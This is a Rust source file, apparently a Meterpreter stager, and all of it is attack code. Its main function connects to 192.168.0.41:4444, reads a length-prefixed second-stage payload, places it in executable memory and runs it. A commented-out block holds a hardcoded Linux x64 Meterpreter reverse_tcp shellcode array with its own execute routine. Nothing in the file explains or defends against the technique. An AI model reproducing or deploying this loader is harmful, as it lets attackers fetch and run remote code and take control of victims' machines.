extern crate mmap;
extern crate byteorder;

use std::io::prelude::*;
use std::net::TcpStream;
use std::{mem, ptr};
use byteorder::{LittleEndian, ReadBytesExt};
use mmap::*;

/*
 * Works correctly.
 * Shellcode: linux/x64/meterpreter/reverse_tcp
 * Generated with: generate -f  /tmp/met
fn exec_shellcode() {

    let opts = [
        MapOption::MapReadable,
        MapOption::MapWritable,
        MapOption::MapExecutable
    ];
    
    let shellcode = [0x48, 0x31, 0xff, 0x6a, 0x09, 0x58, 0x99, 0xb6, 0x10, 0x48, 0x89, 0xd6, 0x4d, 0x31, 0xc9, 0x6a, 0x22, 0x41, 0x5a, 0xb2, 0x07, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x5b, 0x6a, 0x0a, 0x41, 0x59, 0x56, 0x50, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x44, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x00, 0x29, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x79, 0x1b, 0x49, 0xff, 0xc9, 0x74, 0x22, 0x6a, 0x23, 0x58, 0x6a, 0x00, 0x6a, 0x05, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x79, 0xb7, 0xeb, 0x0c, 0x59, 0x5e, 0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x02, 0xff, 0xe6, 0x6a, 0x3c, 0x58, 0x6a, 0x01, 0x5f, 0x0f, 0x05];
    let mapping = MemoryMap::new(shellcode.len(), &opts).unwrap();

    unsafe {
        ptr::copy(shellcode.as_ptr(), mapping.data(), shellcode.len());
        mem::transmute::<_, fn()>(mapping.data())();
    }
}
*/

fn exec_shellcode(shellcode: &mut [u8]) {

    println!("Got stage2, executing now ...");
    let opts = [
        MapOption::MapReadable,
        MapOption::MapWritable,
        MapOption::MapExecutable
    ];

    let mapping = MemoryMap::new(shellcode.len(), &opts).unwrap();

    unsafe {
        ptr::copy(shellcode.as_ptr(), mapping.data(), shellcode.len());
        mem::transmute::<_, fn()>(mapping.data())();
    }
}

/*
fn get_first_stage(connect_string: &str) -> &mut [u8] {
    let mut stream = TcpStream::connect(connect_string).unwrap();
    let mut stage2_len = [0; 4];
    stream.read(&mut stage2_len).unwrap();
    let mut stage2_vec = vec![0;99999];
    let mut slice = stage2_vec.as_mut_slice();
    stream.read(&mut slice).unwrap();
    return slice
}
*/

fn main() {
    let mut stream = TcpStream::connect("192.168.0.41:4444").unwrap();
    let mut stage2_len: [u8;4] = [0;4];
    stream.read(&mut stage2_len).unwrap();
    let mut buf = &stage2_len[..];
    let size = buf.read_u32::<LittleEndian>().unwrap();
    println!("Size: {}", size);
    let mut total_read: usize = 0;
    let mut stage2_vec = Vec::new();
    while total_read < size as usize {
        let mut buf: [u8;2048] = [0;2048];
        total_read += stream.read(&mut buf).unwrap();
        stage2_vec.extend_from_slice(&buf);
    }
    println!("Read: {}", total_read);
    exec_shellcode(&mut stage2_vec[..]);
}
